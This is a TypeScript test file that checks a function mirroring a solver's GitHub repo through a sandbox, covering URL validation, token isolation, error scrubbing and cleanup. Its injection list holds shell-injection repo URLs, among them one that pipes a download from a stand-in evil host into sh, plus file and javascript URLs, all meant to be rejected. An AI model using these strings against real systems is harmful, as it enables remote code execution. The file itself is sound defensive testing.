import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { CommandExitError, TimeoutError } from "e2b";
import { mirrorSubmissionRepo } from "./mirror";
import type { MirrorDeps } from "./mirror";
import type { CommandOutcome, SandboxLike } from "@/lib/sandbox/execute";

const SOLVER_TOKEN = "gho_SOLVERtokenValue123";
const PLATFORM_TOKEN = "ghp_PLATFORMtokenValue456";
const SHA = "c".repeat(40);
const REPO = { fullName: "bountied-dev/sub-1", htmlUrl: "https://github.com/bountied-dev/sub-1", cloneUrl: "https://github.com/bountied-dev/sub-1.git" };

type Reply = Partial<CommandOutcome> | Error;
type Seen = { command: string; envs: Record<string, string> };

function harness(handlers: Array<[RegExp, Reply]> = [], over: Partial<MirrorDeps> = {}) {
  const seen: Seen[] = [];
  let killed = 0;
  let booted = 0;
  const sandbox: SandboxLike = {
    commands: {
      async run(command, options) {
        seen.push({ command, envs: (options as { envs?: Record<string, string> } | undefined)?.envs ?? {} });
        const hit = handlers.find(([re]) => re.test(command));
        const reply = hit ? hit[1] : {};
        if (reply instanceof Error) throw reply;
        return { stdout: "", stderr: "", exitCode: 0, ...reply };
      },
    },
    async kill() {
      killed += 1;
    },
  };
  const created: string[] = [];
  const deleted: string[] = [];
  const deps: MirrorDeps = {
    createRepo: vi.fn(async () => {
      created.push(REPO.fullName);
      return { ok: true as const, repo: REPO };
    }),
    deleteRepo: vi.fn(async (fullName: string) => {
      deleted.push(fullName);
    }),
    createSandbox: vi.fn(async () => {
      booted += 1;
      return sandbox;
    }),
    ...over,
  };
  return { deps, seen, created, deleted, killed: () => killed, booted: () => booted };
}

const exitError = (exitCode: number, stderr = "") => new CommandExitError({ exitCode, stdout: "", stderr, error: "exit" });
const commandTimeout = () => new TimeoutError("x: exceeding 'timeoutMs' — the total time a long running request can be active.");
const HEAD: [RegExp, Reply] = [/rev-parse HEAD/, { stdout: SHA + "\n" }];

const params = (sourceRepoUrl = "https://github.com/solver/project") => ({
  submissionId: "sub1", sourceRepoUrl, solverToken: SOLVER_TOKEN, runtime: "PYTHON" as const, problemTitle: "A problem", attemptNumber: 1,
});

beforeEach(() => {
  process.env.PLATFORM_GITHUB_TOKEN = PLATFORM_TOKEN;
});
afterEach(() => {
  delete process.env.PLATFORM_GITHUB_TOKEN;
});

describe("mirrorSubmissionRepo: the repo URL is attacker-controlled text that reaches a shell", () => {
  const injections = [
    "https://github.com/own/repo$(touch$IFS/tmp/pwned)",
    "https://github.com/own/repo$(curl$IFS-sS$IFSevil.test|sh)",
    "https://github.com/own/repo;id",
    "https://github.com/own/repo&&id",
    "https://github.com/own/repo|id",
    'https://github.com/own/repo"id',
    "https://github.com/own/repo`id`",
    "https://github.com/own/repo/../../x",
    "https://github.com/own/repo/tree/main",
    "https://user:$(touch$IFS/tmp/pwned)@github.com/solver/project",
    "https://github.com/solver/project/?a=b&c=$(id)",
    "https://github.com/own",
    "https://github.com/$(id)/repo",
    "http://github.com/own/repo",
    "https://github.com.evil.test/own/repo",
    "https://evil.test/own/repo",
    "ssh://git@github.com/own/repo",
    "git@github.com:own/repo.git",
    "javascript:alert(1)",
    "file:///etc/passwd",
    "not a url",
    "",
  ];

  it.each(injections)("refuses %j before creating a repo or booting a sandbox", async (url) => {
    const h = harness();
    const r = await mirrorSubmissionRepo(params(url), h.deps);
    expect(r.ok, url).toBe(false);
    expect(h.created).toHaveLength(0);
    expect(h.booted()).toBe(0);
    expect(h.seen).toHaveLength(0);
  });

  it("runs only commands built from the validated owner and repo", async () => {
    const h = harness([HEAD]);
    await mirrorSubmissionRepo(params("https://github.com/Own-er/re.po_1.git"), h.deps);
    const clone = h.seen[0].command;
    expect(clone).toContain('fetch --depth=1 "https://github.com/Own-er/re.po_1.git"');
    for (const { command } of h.seen) expect(command).not.toMatch(/\$\(|`|;\s*id|&&\s*id/);
  });

  it.each([
    "https://github.com/solver/project?x=$(touch$IFS/tmp/pwned)",
    "https://github.com/solver/project#$(touch$IFS/tmp/pwned)",
  ])("accepts %j but throws the extra parts away: none of it reaches a command", async (url) => {
    const h = harness([HEAD]);
    const r = await mirrorSubmissionRepo(params(url), h.deps);
    expect(r.ok).toBe(true);
    expect(h.seen[0].command).toContain('"https://github.com/solver/project.git"');
    for (const { command } of h.seen) {
      expect(command).not.toContain("$(");
      expect(command).not.toContain("pwned");
      expect(command).not.toContain("user:");
    }
  });

  it("refuses a platform repo address that isn't a plain GitHub repo, and cleans up", async () => {
    const h = harness([], {
      createRepo: async () => ({ ok: true as const, repo: { ...REPO, cloneUrl: "https://github.com/bountied-dev/sub-1.git$(id)" } }),
    });
    const r = await mirrorSubmissionRepo(params(), h.deps);
    expect(r.ok).toBe(false);
    expect(h.deleted).toEqual([REPO.fullName]);
    expect(h.booted()).toBe(0);
  });
});

describe("mirrorSubmissionRepo: where each token lives", () => {
  it("never puts either token in any command line", async () => {
    const h = harness([HEAD]);
    await mirrorSubmissionRepo(params(), h.deps);
    for (const { command } of h.seen) {
      expect(command).not.toContain(SOLVER_TOKEN);
      expect(command).not.toContain(PLATFORM_TOKEN);
      expect(command).not.toContain("x-access-token");
    }
  });

  it("gives the clone ONLY the solver token, and the push ONLY the platform token", async () => {
    const h = harness([HEAD]);
    await mirrorSubmissionRepo(params(), h.deps);
    const clone = h.seen.find((s) => s.command.includes("fetch"))!;
    const push = h.seen.find((s) => s.command.includes("push"))!;
    const b64 = (t: string) => Buffer.from(`x-access-token:${t}`).toString("base64");

    expect(Object.values(clone.envs)).toContain(b64(SOLVER_TOKEN));
    expect(Object.values(clone.envs)).not.toContain(b64(PLATFORM_TOKEN));
    expect(Object.values(push.envs)).toContain(b64(PLATFORM_TOKEN));
    expect(Object.values(push.envs)).not.toContain(b64(SOLVER_TOKEN));
  });

  it("gives no other command (such as reading the commit) any token at all", async () => {
    const h = harness([HEAD]);
    await mirrorSubmissionRepo(params(), h.deps);
    const rest = h.seen.filter((s) => !s.command.includes("fetch") && !s.command.includes("push"));
    expect(rest.length).toBeGreaterThan(0);
    for (const s of rest) expect(Object.keys(s.envs).some((k) => k.startsWith("BOUNTIED_"))).toBe(false);
  });

  it("sends the credential as an HTTP header, never prompting", async () => {
    const h = harness([HEAD]);
    await mirrorSubmissionRepo(params(), h.deps);
    const clone = h.seen.find((s) => s.command.includes("fetch"))!;
    expect(clone.command).toContain('-c "http.extraHeader=Authorization: Basic $BOUNTIED_SRC_AUTH"');
    expect(clone.envs.GIT_TERMINAL_PROMPT).toBe("0");
  });

  it("refuses to run without a platform token, creating nothing", async () => {
    delete process.env.PLATFORM_GITHUB_TOKEN;
    const h = harness();
    const r = await mirrorSubmissionRepo(params(), h.deps);
    expect(r.ok).toBe(false);
    expect(h.created).toHaveLength(0);
    expect(h.booted()).toBe(0);
  });
});

describe("mirrorSubmissionRepo: the happy path", () => {
  it("pushes only a history-free snapshot and reports the source commit", async () => {
    const h = harness([HEAD]);
    const r = await mirrorSubmissionRepo(params(), h.deps);
    expect(r).toEqual({ ok: true, repo: REPO, mirroredCommitSha: SHA });
    const push = h.seen.find((s) => s.command.includes("push"))!;
    expect(push.command).toContain('push -u origin main');
    expect(push.command).not.toContain("push --all");
    expect(push.command).not.toContain("push --tags");
    expect(push.command).not.toContain("--mirror");
    expect(h.deleted).toHaveLength(0);
    expect(h.killed()).toBe(1);
  });

  it("resolves the source commit and pushes a history-free snapshot", async () => {
    const h = harness([HEAD]);
    await mirrorSubmissionRepo(params(), h.deps);
    const order = h.seen.map((s) => (s.command.includes("fetch") ? "fetch" : s.command.includes("push") ? "push" : s.command.includes("rev-parse") ? "head" : "snapshot"));
    expect(order).toEqual(["fetch", "head", "snapshot", "snapshot", "push"]);
  });

  it("fails closed when the selected source commit cannot be verified", async () => {
    for (const reply of [{ stdout: "garbage" }, { stdout: SHA, exitCode: 1 }, exitError(128, "fatal"), commandTimeout(), new Error("socket hang up")] as Reply[]) {
      const h = harness([[/rev-parse HEAD/, reply]]);
      const r = await mirrorSubmissionRepo(params(), h.deps);
      expect(r.ok).toBe(false);
      expect(h.deleted).toEqual([REPO.fullName]);
    }
  });

  it("preserves the exact selected source commit as the mirror identity", async () => {
    const h = harness();
    const r = await mirrorSubmissionRepo({ ...params(), selectedCommitSha: SHA }, h.deps);
    expect(r.ok && r.mirroredCommitSha).toBe(SHA);
    expect(h.seen[0].command).toContain(SHA);
  });
});

describe("mirrorSubmissionRepo: failures clean up and never leak a token", () => {
  const b64 = (t: string) => Buffer.from(`x-access-token:${t}`).toString("base64");

  it("a failed clone deletes the platform repo, kills the sandbox and never pushes", async () => {
    const h = harness([[/fetch/, exitError(128, "fatal: Authentication failed")]]);
    const r = await mirrorSubmissionRepo(params(), h.deps);
    expect(r.ok).toBe(false);
    expect(r.ok === false && r.reason).toContain("Authentication failed");
    expect(h.deleted).toEqual([REPO.fullName]);
    expect(h.killed()).toBe(1);
    expect(h.seen.some((s) => s.command.includes("push"))).toBe(false);
  });

  it("scrubs both tokens, in raw and base64 form, from a clone error", async () => {
    const stderr = `fatal: ${SOLVER_TOKEN} ${PLATFORM_TOKEN} ${b64(SOLVER_TOKEN)} ${b64(PLATFORM_TOKEN)}`;
    const h = harness([[/fetch/, exitError(128, stderr)]]);
    const r = await mirrorSubmissionRepo(params(), h.deps);
    const reason = r.ok === false ? r.reason : "";
    for (const secret of [SOLVER_TOKEN, PLATFORM_TOKEN, b64(SOLVER_TOKEN), b64(PLATFORM_TOKEN)]) expect(reason).not.toContain(secret);
  });

  it("scrubs both tokens from a push error", async () => {
    const stderr = `remote: denied ${PLATFORM_TOKEN} ${b64(PLATFORM_TOKEN)} ${SOLVER_TOKEN}`;
    const h = harness([[/push/, exitError(1, stderr)]]);
    const r = await mirrorSubmissionRepo(params(), h.deps);
    const reason = r.ok === false ? r.reason : "";
    expect(r.ok).toBe(false);
    for (const secret of [SOLVER_TOKEN, PLATFORM_TOKEN, b64(PLATFORM_TOKEN)]) expect(reason).not.toContain(secret);
    expect(h.deleted).toEqual([REPO.fullName]);
  });

  it("truncates a long error to 300 characters", async () => {
    const h = harness([[/fetch/, exitError(128, "x".repeat(2000))]]);
    const r = await mirrorSubmissionRepo(params(), h.deps);
    expect(r.ok === false && r.reason.length).toBeLessThan(500);
  });

  it("reports a slow clone and a slow push as such, and cleans up", async () => {
    const slowClone = harness([[/fetch/, commandTimeout()]]);
    const a = await mirrorSubmissionRepo(params(), slowClone.deps);
    expect(a.ok === false && a.reason).toContain("fetch timed out");
    expect(slowClone.deleted).toEqual([REPO.fullName]);

    const slowPush = harness([[/push/, commandTimeout()]]);
    const b = await mirrorSubmissionRepo(params(), slowPush.deps);
    expect(b.ok === false && b.reason).toContain("push timed out");
    expect(slowPush.deleted).toEqual([REPO.fullName]);
  });

  it("deletes the platform repo and scrubs the message when the sandbox itself fails", async () => {
    const h = harness([], {
      createSandbox: async () => {
        throw new Error(`E2B failed for ${PLATFORM_TOKEN}`);
      },
    });
    const r = await mirrorSubmissionRepo(params(), h.deps);
    expect(r.ok).toBe(false);
    expect(r.ok === false && r.reason).not.toContain(PLATFORM_TOKEN);
    expect(h.deleted).toEqual([REPO.fullName]);
  });

  it("reports a dropped connection mid-run as an import failure and cleans up", async () => {
    const h = harness([[/push/, new Error("socket hang up")]]);
    const r = await mirrorSubmissionRepo(params(), h.deps);
    expect(r.ok === false && r.reason).toContain("Repository import failed");
    expect(h.deleted).toEqual([REPO.fullName]);
    expect(h.killed()).toBe(1);
  });

  it("returns GitHub's refusal untouched when the platform repo can't be created, booting nothing", async () => {
    const h = harness([], { createRepo: async () => ({ ok: false as const, reason: "GitHub said no" }) });
    const r = await mirrorSubmissionRepo(params(), h.deps);
    expect(r).toEqual({ ok: false, reason: "GitHub said no" });
    expect(h.booted()).toBe(0);
    expect(h.deleted).toHaveLength(0);
  });
});
